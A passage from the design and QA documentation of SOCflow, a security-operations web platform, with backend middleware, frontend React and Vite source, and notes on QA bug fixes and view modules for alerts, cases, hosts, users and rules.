            { id: 4, lat: -33.8688, lng: 151.2093,  city: 'Sydney',     hostCount: 5,  threatLevel: 'low' },
            { id: 5, lat: 1.3521,   lng: 103.8198,  city: 'Singapore',  hostCount: 22, threatLevel: 'critical' }
        ]
    });
});

async function startup() {
    await initDB();
    await initRedis();
    audit.init(pool, dbRun);
    rehashSeededPasswords();
    app.listen(PORT, '0.0.0.0', () => {
        console.log(`SOCflow backend running on port ${PORT}`);
    });
}

startup();
```

## 7.2 Design Notes — Server

| Concern | Decision | Detail |
|---|---|---|
| Boot order | `initDB → initRedis → audit.init → rehashSeededPasswords → listen` | Fail-fast on DB; DB credentials via `.env` (§17.2) |
| Redis optional | `if (!process.env.REDIS_URL) return;` | Platform fully functional without Redis; ingestion just skips queueing |
| Query helper API | `dbRun/dbAll/dbGet` mirroring sqlite3 idioms (`lastID/changes`) | Single abstraction point over mysql2 |
| Case patch builder | dynamic SET list from provided fields only | Whitelist columns; parameterized values |
| Search builder | `WHERE 1=1` + per-parameter LIKE appends | All values bound — no injection |
| Enrollment | secret check → upsert host → create agent with `uuid` + 32-byte hex key | replayable demo onboarding |
| Rule toggle | `enabled ⇄ 0|1` + `updated_at=NOW()` | reflected instantly in UI |
| 404 semantics | e.g. `/api/alerts/:id` returns **404** for missing rows | (was 500 — fixed §17.1) |

## 7.3 Full Source — `backend/middleware/auth.js`

```javascript
const requireAuth = (req, res, next) => {
    if (!req.session?.user) {
        return res.status(401).json({ error: 'Unauthorized: No active session' });
    }
    next();
};

const requireRole = (...roles) => (req, res, next) => {
    if (!req.session?.user) {
        return res.status(401).json({ error: 'Unauthorized' });
    }
    if (!roles.includes(req.session.user.role)) {
        return res.status(403).json({ error: 'Forbidden: Insufficient permissions' });
    }
    next();
};

module.exports = { requireAuth, requireRole };
```

**Note.** `requireRole('Analyst')` / `requireRole('Manager')` compare against
`session.user.role` which stores the exact `soc_role.role_name` casing
(`'Analyst'`, `'Manager'`) set at login time. Tested in §16.6.

## 7.4 Full Source — `backend/middleware/audit.js`

```javascript
let _dbRun = null;

const init = (db, dbRunFn) => { _dbRun = dbRunFn; };

const logAuditAction = async (userId, actionType, objectType, objectId, details, ipAddress) => {
    if (!_dbRun) return;
    try {
        await _dbRun(
            'INSERT INTO soc_audit_log (user_id, action_type, object_type, object_id, details, ip_address) VALUES (?, ?, ?, ?, ?, ?)',
            [userId || null, actionType, objectType || null, objectId || null,
             details ? JSON.stringify(details) : null, ipAddress || null]
        );
    } catch (err) {
        console.error('Audit log error:', err.message);
    }
};

module.exports = { init, logAuditAction };
```

## 7.5 Field-Level Notes on `/api/alerts/:id`

The original select included `a.matched_text` (a stray column that exists in neither the
MySQL nor the SQLite schema). Every `GET /api/alerts/:id` therefore failed with:

```
{"error":"Unknown column 'a.matched_text' in 'field list'"}   HTTP 500
```

Diagnosis (QA): `DESCRIBE soc_alert_reference` listed no `matched_text`; the frontend
(`views/AlertDetail.tsx`) only references `n.matched_text` inside a conditional
(`n.matched_text && …`), so the column is optional and was removed from the select.
Fix applied and verified in §17.1 / §16.9.3.

## 7.6 Backend Environment Loading

`require('dotenv').config()` reads `backend/.env` when the process working directory is
`backend/`:

```dotenv
# backend/.env  (created during QA — see §17.2)
DB_HOST=127.0.0.1
DB_USER=socflow
DB_PASSWORD=socflow_pass
DB_NAME=socflow
PORT=5001
```

Optional keys (not set in the QA environment): `SESSION_SECRET`, `ENROLLMENT_SECRET`,
`REDIS_URL`, `DB_PORT`.

# 8. Frontend Implementation (Core Framework)

## 8.1 HTML Shell — `index.html` (complete)

```html
<!DOCTYPE html>
<html lang="en" data-theme="dark">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>SOCflow — LotL Detection Platform</title>
  <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Crect width='24' height='24' rx='6' fill='%232563eb'/%3E%3Cpath d='M12 4l6 2.5v4.2c0 4.1-2.6 7.6-6 9.3-3.4-1.7-6-5.2-6-9.3V6.5L12 4z' fill='white'/%3E%3C/svg%3E">
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link
    href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Fira+Code:wght@400;500&display=swap"
    rel="stylesheet">
  <script>
    (function () {
      var t = localStorage.getItem('socflow-theme') || 'dark';
      document.documentElement.setAttribute('data-theme', t);
      if (t === 'dark') document.documentElement.classList.add('dark');
    })();
  </script>
  <link rel="stylesheet" href="/index.css">
</head>

<body>
  <div id="root"></div>
  <script type="module" src="/index.tsx"></script>
</body>

</html>
```

Key details:
- **Pre-paint theme boot**: inline script applies the stored theme *before* any CSS
  paints — prevents dark→light flash on reload. **Tested** (§16.8/M5).
- The favicon is an inline data-URI SVG added during QA (§17.3) to silence the
  automatic `/favicon.ico` 404.
- Google Fonts `Inter` (UI) + `Fira Code` (mono, forensic views).

## 8.2 Bootstrap — `index.tsx` (complete)

```tsx
import React from 'react';
import ReactDOM from 'react-dom/client';
import './index.css';
import App from './App';

const rootElement = document.getElementById('root');
if (!rootElement) {
  throw new Error("Could not find root element to mount to");
}

const root = ReactDOM.createRoot(rootElement);
root.render(
  <React.StrictMode>
    <App />
  </React.StrictMode>
);
```

## 8.3 Route Table — `App.tsx` (complete)

```tsx
import React from 'react';
import { BrowserRouter, Routes, Route, Navigate } from 'react-router-dom';
import Layout from './components/Layout';
import ProtectedRoute from './components/ProtectedRoute';
import Login from './views/Login';
import Overview from './views/Overview';
import UserProfile from './views/UserProfile';

// Manager
import Hosts from './views/Hosts';
import Users from './views/Users';
import Rules from './views/Rules';
import Audit from './views/Audit';
import Reports from './views/Reports';

// Analyst
import Alerts from './views/Alerts';
import AlertDetail from './views/AlertDetail';
import Cases from './views/Cases';
import CaseDetail from './views/CaseDetail';
import LogExplorer from './views/LogExplorer';

function App() {
  return (
    <BrowserRouter>
      <Routes>
        {/* Auth Routes */}
        <Route path="/" element={<Navigate to="/login" replace />} />
        <Route path="/login" element={<Login />} />

        {/* Protected Routes inside shared Layout */}
        <Route element={<Layout />}>

          {/* Both roles */}
          <Route path="/overview" element={
            <ProtectedRoute allowedRoles={['MANAGER', 'ANALYST']}>
              <Overview />
            </ProtectedRoute>
          } />
          <Route path="/profile" element={
            <ProtectedRoute allowedRoles={['MANAGER', 'ANALYST']}>
              <UserProfile />
            </ProtectedRoute>
          } />

          {/* Manager only */}
          <Route path="/hosts" element={
            <ProtectedRoute allowedRoles={['MANAGER']}>
              <Hosts />
            </ProtectedRoute>
          } />
          <Route path="/users" element={
            <ProtectedRoute allowedRoles={['MANAGER']}>
              <Users />
            </ProtectedRoute>
          } />
          <Route path="/rules" element={
            <ProtectedRoute allowedRoles={['MANAGER']}>
              <Rules />
            </ProtectedRoute>
          } />
          <Route path="/audit" element={
            <ProtectedRoute allowedRoles={['MANAGER']}>
              <Audit />
            </ProtectedRoute>
          } />
          <Route path="/reports" element={
            <ProtectedRoute allowedRoles={['MANAGER']}>
              <Reports />
            </ProtectedRoute>
          } />

          {/* Analyst only */}
          <Route path="/alerts" element={
            <ProtectedRoute allowedRoles={['ANALYST']}>
              <Alerts />
            </ProtectedRoute>
          } />
          <Route path="/alerts/:id" element={
            <ProtectedRoute allowedRoles={['ANALYST']}>
              <AlertDetail />
            </ProtectedRoute>
          } />
          <Route path="/cases" element={
            <ProtectedRoute allowedRoles={['ANALYST']}>
              <Cases />
            </ProtectedRoute>
          } />
          <Route path="/cases/:id" element={
            <ProtectedRoute allowedRoles={['ANALYST']}>
              <CaseDetail />
            </ProtectedRoute>
          } />
          <Route path="/explorer" element={
            <ProtectedRoute allowedRoles={['ANALYST']}>
              <LogExplorer />
            </ProtectedRoute>
          } />

        </Route>

        <Route path="*" element={<Navigate to="/" replace />} />
      </Routes>
    </BrowserRouter>
  );
}

export default App;
```

**Structural choice**: protected routes are nested *inside* `<Route element={<Layout/>}>`,
so the shell renders once per navigation to a protected path (`Outlet` pattern), and every
child is wrapped with a role-aware guard.

## 8.4 Build Configuration — `vite.config.ts` (complete)

```typescript
import path from 'path';
import { defineConfig, loadEnv } from 'vite';
import react from '@vitejs/plugin-react';

export default defineConfig(({ mode }) => {
  const env = loadEnv(mode, '.', '');
  return {
    server: {
      port: 3001,
      host: '0.0.0.0',
      proxy: {
        '/api': {
          target: 'http://localhost:5001',
          changeOrigin: true,
          secure: false,
        }
      },
    },
    plugins: [react()],
    define: {
      'process.env.API_KEY': JSON.stringify(env.GEMINI_API_KEY),
      'process.env.GEMINI_API_KEY': JSON.stringify(env.GEMINI_API_KEY)
    },
    resolve: {
      alias: {
        '@': path.resolve(__dirname, '.'),
      }
    }
  };
});
```

The `/api` proxy is what makes cookie-based sessions work seamlessly in dev
(same-origin from the browser's perspective) — verified end-to-end in §16.5
(all four contract checks ran through `:3001`, not directly to `:5001`).

## 8.5 PostCSS Pipeline — `postcss.config.js` (complete)

```javascript
export default {
  plugins: {
    '@tailwindcss/postcss': {},
    autoprefixer: {},
  },
}
```

**QA note** (§16.10): Tailwind v4 is invoked with **v3 directives**
(`@tailwind base; @tailwind components; @tailwind utilities;` in `index.css`).
Empirically this still emits a working sheet — the served bundle's first line is
`/*! tailwindcss v4.3.3 */` with `@layer` rules intact — but it is legacy syntax and
should migrate to `@import "tailwindcss";` (§17.2/known-issue note).

## 8.6 Theme System — `services/useTheme.ts` (complete)

```typescript
import { useState, useCallback, useEffect } from 'react';

export const THEME_KEY = 'socflow-theme';

export const getTheme = (): 'light' | 'dark' =>
    (localStorage.getItem(THEME_KEY) as 'light' | 'dark') || 'dark';

export const useTheme = () => {
    const [theme, setTheme] = useState<'light' | 'dark'>(getTheme());

    useEffect(() => {
        const root = document.documentElement;
        if (theme === 'dark') {
            root.classList.add('dark');
        } else {
            root.classList.remove('dark');
        }
    }, [theme]);

    const toggleTheme = useCallback(() => {
        setTheme(prev => {
            const next = prev === 'light' ? 'dark' : 'light';
            localStorage.setItem(THEME_KEY, next);
            document.documentElement.setAttribute('data-theme', next);
            if (next === 'dark') {
                document.documentElement.classList.add('dark');
            } else {
                document.documentElement.classList.remove('dark');
            }
            return next;
        });
    }, []);

    return { theme, toggleTheme };
};
```

Elements consulted: `data-theme` attribute (CSS variables) **and** the `dark` class
(Tailwind's `dark:` variant). Both are synchronized by this hook and by the pre-paint
boot script. **Tested** (§16.8-M5: `dark → light` transition observed).

## 8.7 Client Route Guard — `components/ProtectedRoute.tsx` (complete, incl. §17 fix)

```tsx
import React from 'react';
import { Navigate } from 'react-router-dom';

interface ProtectedRouteProps {
    children: React.ReactNode;
    allowedRoles?: string[];
}

const ProtectedRoute: React.FC<ProtectedRouteProps> = ({ children, allowedRoles }) => {
    const token    = localStorage.getItem('token');
    const userRole = localStorage.getItem('userRole')?.toUpperCase();

    if (!token || !userRole) {
        return <Navigate to="/" replace />;
    }

    if (allowedRoles && !allowedRoles.includes(userRole)) {
        return <Navigate to="/overview" replace />;
    }

    return <>{children}</>;
};

export default ProtectedRoute;
```

⚠️ **Bug fixed during QA** (§17.1): `Login.tsx` originally never wrote the `token` key —
it only stored `userRole/userName/userEmail/userId`. Every successful login consequently
bounced straight back to `/login` (guard's first branch), i.e. *"the application login is
not working"* even though the API authenticated fine. Fix: `Login.tsx` now calls

```tsx
localStorage.setItem('token', 'session-active');
```

before navigating to `/overview`. The key matches the logout cleanup list in
`Layout.tsx` (`['token','userRole','userName','userEmail','userId'].
forEach(k => localStorage.removeItem(k))`).

## 8.8 App Shell — `components/Layout.tsx` (complete)

```tsx
import React from 'react';
import { NavLink, Outlet, useLocation, useNavigate } from 'react-router-dom';
import {
    LayoutDashboard, Shield, Server, Search, Bell, User,
    Briefcase, LogOut, Sun, Moon,
    Users, ShieldAlert, ClipboardList, FileText, AlertTriangle
} from 'lucide-react';
import { useTheme } from '../services/useTheme';
import Sidebar from './Sidebar';

const Layout = () => {
    const location = useLocation();
    const navigate = useNavigate();
    const { theme, toggleTheme } = useTheme();

    const userRole = localStorage.getItem('userRole') || '';
    const userName = localStorage.getItem('userName') || 'User';
    const isManager = userRole === 'MANAGER'; // Fixed role string case

    const getPageTitle = (path: string) => {
        if (path.includes('hosts')) return 'Hosts';
        if (path.includes('users')) return 'Users';
        if (path.includes('rules')) return 'Detection Rules';
        if (path.includes('audit')) return 'Audit Log';
        if (path.includes('reports')) return 'Reports';
        if (path.includes('alerts')) return 'Alerts';
        if (path.includes('cases')) return 'Cases';
        if (path.includes('explorer')) return 'Log Explorer';
        if (path.includes('profile')) return 'Profile';
        return 'Overview';
    };

    const handleLogout = async () => {
        try {
            await fetch('/api/logout', { method: 'POST', credentials: 'include' });
        } catch { /* noop */ }
        ['token', 'userRole', 'userName', 'userEmail', 'userId']
            .forEach(k => localStorage.removeItem(k));
        navigate('/');
    };

    return (
        <div style={{ display: 'flex', minHeight: '100vh', background: 'var(--bg-app)' }}
             className="bg-gray-50 dark:bg-gray-900 text-gray-900 dark:text-white">
            <Sidebar />

            {/* Main column */}
            <div style={{ flex: 1, display: 'flex', flexDirection: 'column', minWidth: 0 }}>
                {/* Topbar */}
                <header style={{
                    height: '58px', flexShrink: 0, display: 'flex', alignItems: 'center',
                    justifyContent: 'space-between', padding: '0 1.5rem',
                    borderBottom: 'var(--border)', background: 'var(--bg-topbar)',
                    backdropFilter: 'blur(8px)', position: 'sticky', top: 0, zIndex: 10
                }} className="border-gray-800 bg-gray-50 dark:bg-gray-900">
                    <div style={{ fontSize: '1rem', fontWeight: 600,
                                  color: 'var(--text-primary)' }}
                         className="text-gray-900 dark:text-white">
                        {getPageTitle(location.pathname)}
                    </div>

                    <div className="row flex items-center" style={{ gap: '0.5rem' }}>
                        <div style={{ position: 'relative', width: '260px' }}>
                            <Search size={14} style={{ position: 'absolute', left: '10px',
                                top: '50%', transform: 'translateY(-50%)',
                                color: 'var(--text-muted)' }} />
                            <input type="text" className="input bg-white dark:bg-gray-800
                                text-gray-900 dark:text-white border-gray-700 rounded-md"
                                placeholder="Search..." style={{ paddingLeft: '30px',
                                paddingTop: '0.35rem', paddingBottom: '0.35rem' }} />
                        </div>
                        <button className="btn btn-ghost hover:bg-white dark:bg-gray-800 rounded-full"
                                style={{ padding: '0.45rem' }}>
                            <Bell size={17} />
                        </button>
                        <button className="btn btn-ghost hover:bg-white dark:bg-gray-800 rounded-full"
                                style={{ padding: '0.45rem' }} onClick={toggleTheme}>
                            {theme === 'dark' ? <Sun size={17} /> : <Moon size={17} />}
                        </button>
                        <NavLink to="/profile" className="row flex items-center hover:bg-white
                            dark:bg-gray-800 rounded-full px-2 py-1"
                            style={{ color: 'var(--text-secondary)', fontSize: '0.82rem',
                                     fontWeight: 500, paddingLeft: '0.5rem',
                                     textDecoration: 'none' }}>
                            <div style={{
                                width: '26px', height: '26px', borderRadius: '50%',
                                background: 'var(--accent-soft)', color: 'var(--accent)',
                                display: 'flex', alignItems: 'center', justifyContent: 'center',
                                fontSize: '0.65rem', fontWeight: 700, marginRight: '8px'
                            }} className="bg-gray-100 dark:bg-gray-700 text-emerald-400">
                                {userName.slice(0, 2).toUpperCase()}
                            </div>
                            <span className="text-gray-800 dark:text-gray-300">{userName}</span>
                        </NavLink>
                        <button onClick={handleLogout} className="btn btn-ghost ml-2 hover:bg-white
                                dark:bg-gray-800 rounded-full p-2" title="Sign Out">
                            <LogOut size={17} className="text-gray-600 dark:text-gray-400
                                    hover:text-gray-900 dark:text-white" />
                        </button>
                    </div>
                </header>

                {/* Page content */}
                <main style={{ flex: 1, overflowY: 'auto' }} className="p-6">
                    <Outlet />
                </main>
            </div>
        </div>
    );
};

export default Layout;
```

## 8.9 Role Navigation — `components/Sidebar.tsx` (complete)

```tsx
import React from 'react';
import { NavLink } from 'react-router-dom';
import { Shield } from 'lucide-react';
import { MANAGER_NAV_ITEMS, ANALYST_NAV_ITEMS, COLORS } from '../constants';

const Sidebar: React.FC = () => {
  const userRole = localStorage.getItem('userRole') || 'ANALYST';
  const isManager = userRole === 'MANAGER';
  const NAV_ITEMS = isManager ? MANAGER_NAV_ITEMS : ANALYST_NAV_ITEMS;

  return (
    <aside className={`flex flex-col flex-shrink-0 w-64 border-r border-gray-800
                      bg-gray-50 dark:bg-gray-900 sticky top-0 h-screen
                      transition-all duration-300 z-20`}>
      <div className="flex items-center gap-3 px-6 py-5 border-b border-gray-800">
        <div className="bg-emerald-500 rounded-lg p-1.5 flex items-center justify-center
                        shadow-lg shadow-emerald-500/20">
          <Shield className="text-gray-900 dark:text-white" size={20} strokeWidth={2.5} />
        </div>
        <div>
          <div className="font-bold text-lg tracking-tight text-gray-900 dark:text-white
                          leading-tight">SOCflow</div>
          <div className="text-[10px] text-emerald-400 font-semibold uppercase
                          tracking-widest">Platform</div>
        </div>
      </div>

      <nav className="flex-1 px-4 py-6 space-y-1 overflow-y-auto">
        <div className="text-xs font-semibold text-gray-500 uppercase tracking-wider
                        mb-4 px-2">Navigation</div>
        {NAV_ITEMS.map((item) => (
          <NavLink
            key={item.id}
            to={item.path}
            className={({ isActive }) =>
              `flex items-center gap-3 px-3 py-2.5 rounded-lg transition-all duration-200
               text-sm font-medium ${
                isActive
                  ? 'bg-emerald-500/10 text-emerald-400'
                  : 'text-gray-600 dark:text-gray-400 hover:bg-white dark:bg-gray-800 hover:text-gray-200'
              }`
            }
          >
            {item.icon}
            {item.label}
          </NavLink>
        ))}
      </nav>

      <div className="p-4 mt-auto border-t border-gray-800">
        <div className="bg-white dark:bg-gray-800/50 p-4 rounded-xl border border-gray-700/50">
          <div className="flex items-center gap-2 mb-1.5">
            <div className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></div>
            <span className="text-[10px] font-bold uppercase tracking-wider
                             text-gray-600 dark:text-gray-400">Engine Online</span>
          </div>
          <p className="text-[11px] text-gray-500 font-medium leading-relaxed">
            {isManager ? 'Manager access active.' : 'Analyst access active.'}
          </p>
        </div>
      </div>
    </aside>
  );
};

export default Sidebar;
```

## 8.10 Navigation Items — `constants.tsx` (excerpt)

```tsx
// Manager
export const MANAGER_NAV_ITEMS = [
  { id: 'overview', label: 'Overview',        path: '/overview', icon: <LayoutDashboard size={20} strokeWidth={1.5} /> },
  { id: 'hosts',    label: 'Hosts',           path: '/hosts',    icon: <Server size={20} strokeWidth={1.5} /> },
  { id: 'users',    label: 'Users',           path: '/users',    icon: <Users size={20} strokeWidth={1.5} /> },
  { id: 'rules',    label: 'Detection Rules', path: '/rules',    icon: <ShieldAlert size={20} strokeWidth={1.5} /> },
  { id: 'audit',    label: 'Audit Log',       path: '/audit',    icon: <ClipboardList size={20} strokeWidth={1.5} /> },
  { id: 'reports',  label: 'Reports',         path: '/reports',  icon: <FileText size={20} strokeWidth={1.5} /> },
  { id: 'profile',  label: 'Profile',         path: '/profile',  icon: <User size={20} strokeWidth={1.5} /> },
];

// Analyst
export const ANALYST_NAV_ITEMS = [
  { id: 'overview', label: 'Overview',     path: '/overview', icon: <LayoutDashboard size={20} strokeWidth={1.5} /> },
  { id: 'alerts',   label: 'Alerts',       path: '/alerts',   icon: <AlertTriangle size={20} strokeWidth={1.5} /> },
  { id: 'cases',    label: 'Cases',        path: '/cases',    icon: <Briefcase size={20} strokeWidth={1.5} /> },
  { id: 'explorer', label: 'Log Explorer', path: '/explorer', icon: <Search size={20} strokeWidth={1.5} /> },
  { id: 'profile',  label: 'Profile',      path: '/profile',  icon: <User size={20} strokeWidth={1.5} /> },
];
```

Cross-mapping vs. backend RBAC — **audited in §16.6**: `Users/Rules/Audit/Reports/Hosts`
pages are manager-only; backend mirrors with `requireRole('Manager')`.

## 8.11 Design Tokens — `index.css` (excerpt: first 60 lines of 400+)

```css
@tailwind base;
@tailwind components;
@tailwind utilities;

/* ============================================================
   SOCflow Design System — minimal professional
   Themes: light (default) + dark, switched via <html data-theme>
   ============================================================ */

:root {
  /* Accent */
  --accent: #2563eb;
  --accent-hover: #1d4ed8;
  --accent-soft: rgba(37, 99, 235, 0.1);
  --accent-border: rgba(37, 99, 235, 0.25);

  /* Semantic status */
  --success: #059669;
  --success-soft: rgba(5, 150, 105, 0.1);
  --success-border: rgba(5, 150, 105, 0.25);
  --warning: #d97706;
  --warning-soft: rgba(217, 119, 6, 0.1);
  --warning-border: rgba(217, 119, 6, 0.25);
  --danger: #dc2626;
  --danger-soft: rgba(220, 38, 38, 0.1);
  --danger-border: rgba(220, 38, 38, 0.25);
  --info: #2563eb;
  --info-soft: rgba(37, 99, 235, 0.1);
  --info-border: rgba(37, 99, 235, 0.25);
  /* … surfaces, typography, radii, shadow, mono font tokens … */
}

[data-theme="dark"] {
  /* Overrides of every token for the dark palette */
}
```

Component classes consumed across all views: `.card`, `.input`, `.btn`,
`.btn-primary`, `.btn-ghost`, typography variables, `--font-mono`
(`Fira Code`) used by the forensic command-line displays.

## 8.12 Authentication UX — `views/Login.tsx` (complete logic section verbatim)

```tsx
const Login: React.FC = () => {
    const navigate = useNavigate();
    const { theme, toggleTheme } = useTheme();

    const [email, setEmail] = useState('');
    const [password, setPassword] = useState('');
    const [error, setError] = useState<string | null>(null);
    const [loading, setLoading] = useState(false);

    const handleLogin = async (e: React.FormEvent) => {
        e.preventDefault();
        setError(null);
        setLoading(true);

        try {
            const res = await fetch('/api/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                credentials: 'include',
                body: JSON.stringify({ email: email.trim(), password })
            });

            const data = await res.json();

            if (!res.ok) {
                throw new Error(data.error || 'Invalid username or password');
            }

            const normalizedRole = (data.role ||
                (email.includes('manager') ? 'manager' : 'analyst')).toUpperCase();
            localStorage.setItem('token', 'session-active');          // ← §17.1 fix
            localStorage.setItem('userRole', normalizedRole);
            localStorage.setItem('userName', data.user?.name || email.split('@')[0]);
            localStorage.setItem('userEmail', data.user?.email || email);
            localStorage.setItem('userId', String(data.user?.id || ''));

            navigate('/overview');
        } catch (err: any) {
            setError(err.message || 'Login failed. Please check your credentials.');
        } finally {
            setLoading(false);
        }
    };
```

UX elements of the same file (not repeated here in full, 275 lines total):
- dark/light toggle button top-right of the card layout,
- error banner with `AlertCircle` icon, `--danger` palette,
- two inputs (`type="email"` required, `type="password"` required) with leading icons,
- submit button with `Authenticating...` busy state,
- Quick Demo Logins panel listing the two seeded accounts.

The rendered page **tested** in §16.8: reported markers `WORK EMAIL`, `PASSWORD`,
`Sign In to SOCflow`, `Quick Demo Logins` in initial body text (original snapshot raced
vite cold-start; final capture caught all markers — see test-log note).

# 9. View Modules

Thirteen routed pages. Repeated pattern in all of them:

```tsx
const API_URL = '/api';
// useEffect(() => { load(); const t = setInterval(load, 10000); return clear; }, [])
// fetch(`${API_URL}/x`, { credentials: 'include' })
// classify severity → tailwind color classes (red/orange/yellow/blue)
```

## 9.1 `views/Overview.tsx` (373 lines)

Fetches `/api/stats` **and** `/api/alerts` in parallel; renders per-role dashboards
(source lines 30–45 area):

```tsx
const res = await Promise.all([
    fetch(`${API_URL}/stats`, { credentials: 'include' }),
    fetch(`${API_URL}/alerts`, { credentials: 'include' })
]);
```

- Analyst: severity KPI cards, recent alert list, quick links to feed.
- Manager: fleet health, alert mix, new-alerts counter — role branch keyed off
  `'ANALYST'` / `'MANAGER'` tokens in the file.
- Empty-data states (tested): "No alert records found." / zeros.

## 9.2 `views/Alerts.tsx` (166 lines)

```tsx
const m = async () => {
    l(!0);
    try {
        const p = await fetch(`${API_URL}/alerts`, { credentials: 'include' });
        if (p.ok) { const x = await p.json(); n(Array.isArray(x) ? x : []); }
    } catch (p) { console.error('Failed to fetch alerts:', p); }
    finally { l(!1); }
};
v.useEffect(() => { m(); const p = setInterval(m, 1e4); return () => clearInterval(p); }, []);
```

- Auto-refresh every 10 s; **status filter** (`ALL/new/open/closed`) and
  **severity filter** (`ALL/critical/high/medium/low`); free-text search across
  description/rule/host/technique; per-row `Investigate →` navigation to `/alerts/:id`.
- Table columns: `Alert ID & Time · Severity · Rule & MITRE · Host · Confidence ·
  Status · Action`.
- **Tested**: seeded CertUtil alert appears with `CRITICAL`; filters interact.

## 9.3 `views/AlertDetail.tsx` (166 lines)

```tsx
const id = tO();  const t = ja();            // useParams / useNavigate
const [n, r] = useState(null);               // alert payload
const [a, i] = useState(true);               // loading
const [l, o] = useState(false);              // ack busy
const [u, s] = useState(null);               // success toast

const c = async () => {
    i(!0);
    try {
        const p = await fetch(`${API_URL}/alerts/${id}`, { credentials: 'include' });
        p.ok && r(await p.json());
    } catch (p) { console.error('Failed to load alert details:', p); }
    finally { i(!1); }
};
useEffect(() => { id && c(); }, [id]);

const f = async () => {                       // acknowledge
    if (!(!n || n.status !== 'new')) {
        o(!0);
        try {
            (await fetch(`${API_URL}/alerts/${id}/ack`, { method: 'POST',
                credentials: 'include' })).ok &&
                (r({ ...n, status: 'open' }),
                 s('Alert acknowledged successfully.'),
                 setTimeout(() => s(null), 3e3));
        } catch (p) { console.error('Failed to acknowledge alert:', p); }
        finally { o(!1); }
    }
};

if (a) return <Loading/>;
if (!n) return <NotFound/>;                   // ← "Alert Not Found" surface (§17.1)
```

Sections (screenshots `DEEP_03`, `F_A1_ack`): breadcrumb, severity chip + rule name +
MITRE chip, host/time meta, **Acknowledge Alert** (only when `status==='new'`) → turns
into `Triaged (open)` plaque, `Link to Case` button, **Command-Line Forensic Inspector**
(mono, dark code panel; `n.matched_text` "Matched Detection Pattern" block when present),
Process Context grid (binary/user/pid/ppid), Detection Reasoning (rule description,
confidence `92 / 100`, detection engine label).

## 9.4 `views/Cases.tsx` (428 lines — largest view)

Handlers (all with `credentials:'include'`):

```tsx
_  = load cases            GET  /api/cases
M  = load case detail      GET  /api/cases/:id     → { ...case, alerts, notes }
K  = create case           POST /api/cases        {title, description, priority}
Y  = add note              POST /api/cases/:id/notes {note_text}
I  = change status         PUT  /api/cases/:id    {status}
```

Layout: left rail (search + status tabs `ALL/open/in_progress/closed` + case cards),
right pane (case header + priority chip + status `<select>`, description panel,
**Linked Threat Alerts (n)** list with score per alert, **Forensic Notes &
Investigation Log** thread + note composer, "No Case Selected" empty state,
**New Incident Case** modal).

**Tested**: seeded case auto-selected, create-case via modal created
"UI Test Case — Automated" (then cleaned, §16.13); status select updates working by
code review + `PUT /api/cases/:id` contract test.

## 9.5 `views/CaseDetail.tsx` (29 lines — complete)

```tsx
const CaseDetail = () => {
  const { id } = useParams(); const t = ja();
  return (
    <div className="flex flex-col gap-6">
      … breadcrumb (Back to Cases / `Case: {id}`) …
      <h1>Case: {id}</h1>
      <p>Investigation details and linked alerts</p>
      <Panel>
        <h3>Case Investigation</h3>
        <p>This view is currently under construction. Future updates will display
           linked alerts, forensic timeline, and resolution status.</p>
      </Panel>
    </div>
  );
};
```

Renders a deterministic placeholder for `/cases/:id` deep links (the rich per-case
workspace lives on `/cases` itself, §9.4).

## 9.6 `views/LogExplorer.tsx` (287 lines)

```tsx
const [e, t] = useState({ query: '', host: '', user: '', process: '' });
const u = async f => {
    f && f.preventDefault();  i(!0);
    try {
        const h = await fetch(`${API_URL}/logs/search`, {
            method: 'POST', headers: { 'Content-Type': 'application/json' },
            credentials: 'include', body: JSON.stringify(e) });
        if (h.ok) { const m = await h.json(); r(Array.isArray(m) ? m : []); }
    } catch … finally { i(!1); }
};
useEffect(() => { u(); }, []);
```

- Four filter fields; results table `Event ID · Timestamp · Host · User ·
  Process Name · Command Line`; client-side **CSV export** via data: URI + programmatic
  anchor click (columns quoted, `"` doubled).
- **Tested**: seeded event (certutil) matches `query='certutil'` (§16.13-A3).

## 9.7 `views/Hosts.tsx` (312 lines)

```tsx
fetch(`${API_URL}/hosts`,  { credentials: 'include' }),
fetch(`${API_URL}/agents`, { credentials: 'include' })
// add host:
const res = await fetch(`${API_URL}/hosts/add`, { method:'POST', … });
// installer:
const res = await fetch(`${API_URL}/agent/download`, { credentials:'include' });
```

Fleet table + agent registry with live `connectivity_status` (server-computed
60-second liveness) and **Add host** modal (hostname + IP) + `Download Agent Installer`
(ZIP button). **Tested**: both seeded hosts render (§16.8-M4).

## 9.8 `views/Users.tsx` (288 lines)

```tsx
const res = await fetch(`${API_URL}/users`, { credentials });                 // list
await fetch(`${API_URL}/users`, { method: 'POST', body: JSON.stringify({      // create
    full_name, email, password, role_id: Number(roleId) }) });
await fetch(`${API_URL}/users/${userId}/status`, { method: 'PATCH',           // toggle
    body: JSON.stringify({ status: nextStatus }) });
```

Header actions: **Provision User** (`UserPlus` icon) → modal with
Name/Email/Password/Role-select + `Create Account`; per-row **Deactivate/Activate**
toggle button; success banner `Account created successfully.` / 
`User status updated to …`; API errors surfaced through `alert(...)`.

**Tested**: modal opens (browser QA, `FINAL_users_modal.png`), page remains
responsive; create + toggle contracts validated at API level (§16.12) after the
render-level checks; audit rows CREATE_USER/UPDATE_USER_STATUS appear.

## 9.9 `views/Rules.tsx` (184 lines)

```tsx
const toggleRule = async (ruleId, currentEnabled) => { …
    await fetch(`${API_URL}/rules/${ruleId}`, { method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ enabled: !currentEnabled }) }); …
```

14 rule cards grouped by severity (`T1218` etc. chips); each row renders
`Active <ToggleRight/>` / `Inactive <ToggleLeft/>`; refresh button spins while loading.
**Tested** by contract test (§16.12-M2: enabled 1→0→1 persisted in MySQL).

## 9.10 `views/Audit.tsx` (166 lines)

Fetches `/api/audit-logs`; maps `action_type` chips — elided snippet:

```tsx
(a => (a.includes('LOGIN')) || a.includes('LOGOUT') … )
```

Timeline list of `login/failed_login/logout/CREATE_USER/UPDATE_USER_STATUS/ACK_ALERT/
